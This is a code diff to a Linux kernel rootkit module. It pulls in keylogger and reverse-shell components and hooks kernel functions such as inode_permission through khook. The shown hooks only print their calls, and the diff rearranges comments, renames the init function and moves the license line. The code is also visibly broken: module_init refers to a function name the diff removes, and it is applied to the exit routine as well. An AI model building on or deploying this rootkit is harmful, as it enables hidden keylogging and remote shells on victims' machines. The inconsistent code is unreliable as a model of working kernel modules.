@@ -11,7 +11,6 @@
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 
-MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Aaron Lichtman");
 MODULE_AUTHOR("Arch Gupta");
 MODULE_AUTHOR("Brandon Weidner");
@@ -41,7 +40,6 @@ static int khook_fget(unsigned int fd) {
     printk("%s(%d) = %d\n", __func__, fd, original);
     return original;
 }
-**/
 
 // Example hook for testing build process.
 KHOOK(inode_permission);
@@ -51,12 +49,12 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
 	return ret;
 }
-
+**/
 
 /**
  * Rootkit module initialization.
  */
-static int rootkit_init(void) {
+static int __init reptile_init(void) {
 	printk(KERN_INFO "Initializing rootkit.\n");
 	khook_init();
 	return 0;
@@ -65,7 +63,7 @@ static int rootkit_init(void) {
 /**
  * Called at exit. All cleanup should be done here.
  */
-static int rootkit_exit(void) {
+static int __exit rootkit_exit(void) {
 	printk(KERN_INFO "Cleaning up rootkit.\n");
 	khook_cleanup();
 	return 0;
@@ -73,3 +71,4 @@ static int rootkit_exit(void) {
 
 module_init(rootkit_init);
 module_init(rootkit_exit);
+MODULE_LICENSE("GPL");
